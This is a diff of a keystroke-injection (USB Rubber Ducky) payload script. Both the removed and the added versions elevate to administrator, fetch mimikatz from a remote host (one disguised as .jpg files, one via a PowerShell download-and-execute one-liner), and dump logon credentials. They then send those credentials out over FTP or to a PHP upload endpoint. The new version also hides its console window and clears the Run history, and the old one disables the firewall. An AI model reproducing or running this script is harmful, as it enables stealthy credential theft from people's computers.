@@ -1,73 +1,20 @@
-REM Author: Pesce
-REM Modified for FTP by ThePlasmaRailgun
-REM Date: 10/20/2013
-REM Downloads mimikatz for 64 bit or 32 bit systems and uploads result to FTP server
-REM -------------open command prompt with admin privileges
+REM Invoke Mimikatz and upload result to webserver
+REM Thanks to Hak5 for the tutorial!
+REM https://www.hak5.org/blog/15-second-password-hack-mr-robot-style
 DELAY 2000
-ESCAPE
-CONTROL ESCAPE
+GUI r
 DELAY 1000
-STRING cmd
-DELAY 1000
-CTRL-SHIFT ENTER
-DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+DELAY 750 
 ALT y
+DELAY 750
+STRING mode con:cols=18 lines=1; color FE
 ENTER
-DELAY 300
-REM -------------download appropriate mimikatz for architecture
-STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://pwningstuff.000webhostapp.com/executables/pw32.jpg','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://pwningstuff.000webhostapp.com/executables/pw64.jpg','%TEMP%\pw.exe');}
+STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://pwningstuff.000webhostapp.com/executables/im.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('https://pwningstuff.000webhostapp.com/upload/creds/rxc.php', $output)"
 ENTER
-DELAY 5000
-REM -------------get the passwords and save to c:\pwlog.txt
-STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
+DELAY 15000
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
-DELAY 2000
-STRING privilege::debug
-ENTER
-DELAY 1000
-STRING sekurlsa::logonPasswords full
-ENTER
-DELAY 1000
-STRING exit
-ENTER
-DELAY 300
-STRING del %TEMP%\pw.exe
-ENTER
-DELAY 300
-REM -------------upload log to FTP server
-STRING netsh firewall set opmode mode=disable
-ENTER
-DELAY 400
-STRING cd %USERPROFILE%
-ENTER
-DELAY 400
-STRING ftp -i 192.168.1.1
-ENTER
-DELAY 400
-STRING USERNAME
-ENTER
-DELAY 400
-STRING PASSWORD
-ENTER
-DELAY 600
-STRING prompt
-ENTER
-DELAY 400
-STRING prompt
-ENTER
-DELAY 400
-STRING MPUT c:\pwlog.txt
-ENTER
-DELAY 4000
-STRING bye
-ENTER
-DELAY 400
-ENTER
-DELAY 200
-STRING netsh firewall set opmode mode=enable
-REM -------------------- delete pwlog
-STRING del c:\pwlog.txt
-ENTER
-DELAY 300
+DELAY 250
 STRING exit
 ENTER
